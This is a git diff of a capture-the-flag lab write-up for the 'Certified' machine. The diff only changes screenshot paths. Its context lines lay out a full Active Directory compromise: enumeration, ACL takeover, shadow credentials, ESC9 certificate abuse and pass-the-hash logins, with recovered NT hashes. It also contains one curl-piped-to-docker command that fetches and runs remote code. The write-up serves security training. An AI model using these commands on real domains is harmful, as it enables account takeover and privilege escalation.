@@ -43,7 +43,7 @@ Check if the host is alive using ICMP:
 ping -c 1 10.129.231.186
 ```
 
-![ping](certified_01_ping.png)
+![ping](screenshots/certified_01_ping.png)
 
 The TTL of 127 confirms a Windows host (default TTL 128, decremented by one hop).
 
@@ -63,7 +63,7 @@ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.231.186 -oG allPorts
 - `-Pn` : Skip host discovery  
 - `-oG` : Output in grepable format  
 
-![allports](certified_02_nmap_allports.png)
+![allports](screenshots/certified_02_nmap_allports.png)
 
 Extract the open ports:
 
@@ -71,7 +71,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![extractports](certified_03_extractports.png)
+![extractports](screenshots/certified_03_extractports.png)
 
 18 open ports identified, all consistent with a Domain Controller profile.
 
@@ -89,8 +89,8 @@ cat targeted
 - `-sV` : Detect service versions  
 - `-oN` : Output in human-readable format  
 
-![targeted 1](certified_04_nmap_targeted_1.png)
-![targeted 2](certified_05_nmap_targeted_2.png)
+![targeted 1](screenshots/certified_04_nmap_targeted_1.png)
+![targeted 2](screenshots/certified_05_nmap_targeted_2.png)
 
 **Findings:**
 
@@ -123,7 +123,7 @@ nxc smb 10.129.231.186 -u judith.mader -p 'judith09'
 nxc winrm 10.129.231.186 -u judith.mader -p 'judith09'
 ```
 
-![nxc smb winrm](certified_06_nxc_smb_winrm.png)
+![nxc smb winrm](screenshots/certified_06_nxc_smb_winrm.png)
 
 SMB authentication succeeds, confirming valid credentials. WinRM access is denied — `judith.mader` is not in the Remote Management Users group.
 
@@ -136,7 +136,7 @@ Using the authenticated RPC session to enumerate all domain users:
 rpcclient -U "judith.mader%judith09" 10.129.231.186 -c "enumdomusers"
 ```
 
-![rpcclient users](certified_07_rpcclient_users.png)
+![rpcclient users](screenshots/certified_07_rpcclient_users.png)
 
 Nine domain users are discovered. Two service accounts stand out: `management_svc` and `ca_operator`, suggesting management functions and certificate operations respectively.
 
@@ -149,13 +149,13 @@ To map attack paths through AD ACLs, data is collected with `bloodhound-python` 
 bloodhound-python -d certified.htb -u 'judith.mader' -p 'judith09' -dc 'dc01.certified.htb' -c all -ns 10.129.231.186
 ```
 
-![bloodhound collection](certified_08_bloodhound_collection.png)
+![bloodhound collection](screenshots/certified_08_bloodhound_collection.png)
 
 Kerberos authentication fails due to the 7-hour clock skew but falls back to NTLM successfully. The collection yields 10 users, 53 groups, and complete ACL data.
 
 After importing into BloodHound CE (started via `curl -L https://ghst.ly/getbhce | docker compose -f - up`), marking `judith.mader` as Owned and inspecting Outbound Object Control reveals the full ACL attack chain:
 
-![bh writeowner](certified_09_bh_writeowner.png)
+![bh writeowner](screenshots/certified_09_bh_writeowner.png)
 
 **ACL chain discovered:**
 
@@ -178,7 +178,7 @@ impacket-dacledit -action write -rights 'WriteMembers' -principal 'judith.mader'
 net rpc group addmem "Management" "judith.mader" -U "certified.htb"/"judith.mader"%'judith09' -S 10.129.231.186
 ```
 
-![acl ownership](certified_10_acl_ownership.png)
+![acl ownership](screenshots/certified_10_acl_ownership.png)
 
 All three steps succeed: ownership transferred, DACL modified with WriteMembers rights, and `judith.mader` added to the MANAGEMENT group.
 
@@ -191,7 +191,7 @@ As a member of the MANAGEMENT group (which has GenericWrite over `management_svc
 pywhisker -d certified.htb -u judith.mader -p 'judith09' --target management_svc --action add
 ```
 
-![pywhisker mgmtsvc](certified_11_pywhisker_mgmtsvc.png)
+![pywhisker mgmtsvc](screenshots/certified_11_pywhisker_mgmtsvc.png)
 
 A PFX certificate is generated that can be used for PKINIT authentication as `management_svc`.
 
@@ -208,7 +208,7 @@ KEY=$(grep -oP '[a-f0-9]{64}' /tmp/tgt.txt | tail -1) && \
 KRB5CCNAME=management_svc.ccache python3 getnthash.py -key $KEY -dc-ip 10.129.231.186 certified.htb/management_svc
 ```
 
-![pkinit nthash mgmtsvc](certified_12_pkinit_mgmtsvc_hash.png)
+![pkinit nthash mgmtsvc](screenshots/certified_12_pkinit_mgmtsvc_hash.png)
 
 **Recovered:** `management_svc` NT Hash: `a091c1832bcdd4677c28b5a6a1295584`
 
@@ -222,8 +222,8 @@ nxc winrm 10.129.231.186 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
 evil-winrm -i 10.129.231.186 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
 ```
 
-![nxc winrm mgmtsvc](certified_13_nxc_mgmtsvc_pwned.png)
-![user flag](certified_14_user_flag.png)
+![nxc winrm mgmtsvc](screenshots/certified_13_nxc_mgmtsvc_pwned.png)
+![user flag](screenshots/certified_14_user_flag.png)
 
 🏁 **User flag obtained:** `C:\Users\management_svc\Desktop\user.txt`
 
@@ -240,7 +240,7 @@ python3 gettgtpkinit.py -cert-pfx QLAg442w.pfx -pfx-pass BlvC0BWhNT6vaj0dO2Hg ce
 KRB5CCNAME=ca_operator.ccache python3 getnthash.py -key 97b70d377dc14ef776d417128c5ac126136a7f632055613d7e6bd9d5331aaad9 -dc-ip 10.129.231.186 certified.htb/ca_operator
 ```
 
-![lateral ca_operator](certified_15_lateral_ca_operator.png)
+![lateral ca_operator](screenshots/certified_15_lateral_ca_operator.png)
 
 **Recovered:** `ca_operator` NT Hash: `b4b86f45c6018f1b664f70805f45d8f2`. This account has SMB access but no WinRM — its value lies in AD CS enrollment rights.
 
@@ -253,7 +253,7 @@ Using certipy to enumerate vulnerable certificate templates with the `ca_operato
 certipy-ad find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.129.231.186 -vulnerable -stdout
 ```
 
-![certipy adcs enum](certified_16_certipy_adcs_enum.png)
+![certipy adcs enum](screenshots/certified_16_certipy_adcs_enum.png)
 
 The **CertifiedAuthentication** template is vulnerable to **ESC9**:
 - `NoSecurityExtension` enrollment flag — certificates contain no object SID
@@ -280,7 +280,7 @@ The certificate is issued with UPN `Administrator` and no object SID. Authentica
 certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.129.231.186
 ```
 
-![esc9 exploit](certified_17_esc9_exploit.png)
+![esc9 exploit](screenshots/certified_17_esc9_exploit.png)
 
 **Recovered:** `administrator` NT Hash: `0d5b49608bbce1751f708748f67e2d34`
 
@@ -295,8 +295,8 @@ nxc winrm 10.129.231.186 -u administrator -H 0d5b49608bbce1751f708748f67e2d34
 evil-winrm -i 10.129.231.186 -u administrator -H 0d5b49608bbce1751f708748f67e2d34
 ```
 
-![nxc admin pwned](certified_18_nxc_admin_pwned.png)
-![root flag](certified_19_root_flag.png)
+![nxc admin pwned](screenshots/certified_18_nxc_admin_pwned.png)
+![root flag](screenshots/certified_19_root_flag.png)
 
 🏁 **Root flag obtained:** `C:\Users\Administrator\Desktop\root.txt`
 
